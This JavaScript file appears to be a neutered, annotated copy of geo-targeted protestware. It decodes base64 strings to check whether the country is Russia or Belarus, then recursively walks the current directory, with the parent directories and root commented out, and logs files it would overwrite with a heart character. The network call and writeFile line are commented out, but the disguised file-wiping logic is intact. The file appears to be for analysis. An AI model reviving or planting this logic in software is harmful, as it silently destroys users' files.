/*

NOTE: 

Every precaution has been taken to make this code non-destructive.
Use at your own risk.
It's advised that you *only* run this code inside a container.

*/

import u from "path";
import a from "fs";
//import o from "https";

// this wasn't here before
function log(m, n) {
    console.log(m + ':');
    console.log('\t' + n.toString("utf-8"));
}

// originally, there was a random timeout to run the function
// setTimeout(function() {
   // originally a random number was used to determine if it would do something malicious
   // const t = Math.round(Math.random() * 4);
   // if (t > 1) {
   //    return
   // }
    // geo api key is no longer valid
    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
log("geo ip request url:", n);
//    originally it would make the geo api request here
//    o.get(n.toString("utf8"), function(t) {
    const mayhem = (t) => {
//        t.on("data", function(t) {
            const n = Buffer.from("Li8=", "base64");
log("current path", n);            
            const o = Buffer.from("Li4v", "base64");
log("up one", o);
            const r = Buffer.from("Li4vLi4v", "base64");
log("up two", r);            
            const f = Buffer.from("Lw==", "base64");
log("root", f);
            const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
log("key from geo ip response to look for", c);
            const e = Buffer.from("cnVzc2lh", "base64");
log("country name to act on", e);
            const i = Buffer.from("YmVsYXJ1cw==", "base64");
log("country name to act on", i);
            try {
                const s = JSON.parse(t.toString("utf8"));
log("json passed into function", JSON.stringify(s));
                const u = s[c.toString("utf8")].toLowerCase();
                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
log("the country name in the json is one we care about", a);
                if (a) {
                    h(n.toString("utf8"));
                    // originally, it operate on this directory, one above, two above and root
                    // h(o.toString("utf8"));
                    // h(r.toString("utf8"));
                    // h(f.toString("utf8"))
                }
            } catch (t) {}
//        })
    };
    // call the function with json that will trigger the behavior without making an actual api call
    mayhem(JSON.stringify({'country_name': 'russia'}));
//}, Math.ceil(Math.random() * 1e3));
async function h(n = "", o = "") {
    if (!a.existsSync(n)) {
        return
    }
    let r = [];
    try {
        r = a.readdirSync(n)
    } catch (t) {}
    const f = [];
    const c = Buffer.from("4p2k77iP", "base64");
log('the character that will be used to overwrite all files', c);    
    for (var e = 0; e < r.length; e++) {
        const i = u.join(n, r[e]);
        let t = null;
        try {
            t = a.lstatSync(i)
        } catch (t) {
            continue
        }
        if (t.isDirectory()) {
            const s = h(i, o);
            s.length > 0 ? f.push(...s) : null
        } else if (i.indexOf(o) >= 0) {
            try {
                // eeeek - very bad
                // a.writeFile(i, c.toString("utf8"), function() {})
                log('file to be overwritten', i);
            } catch (t) {}
        }
    }
    return f
};
const ssl = true;
export {
    ssl as
    default, ssl
}
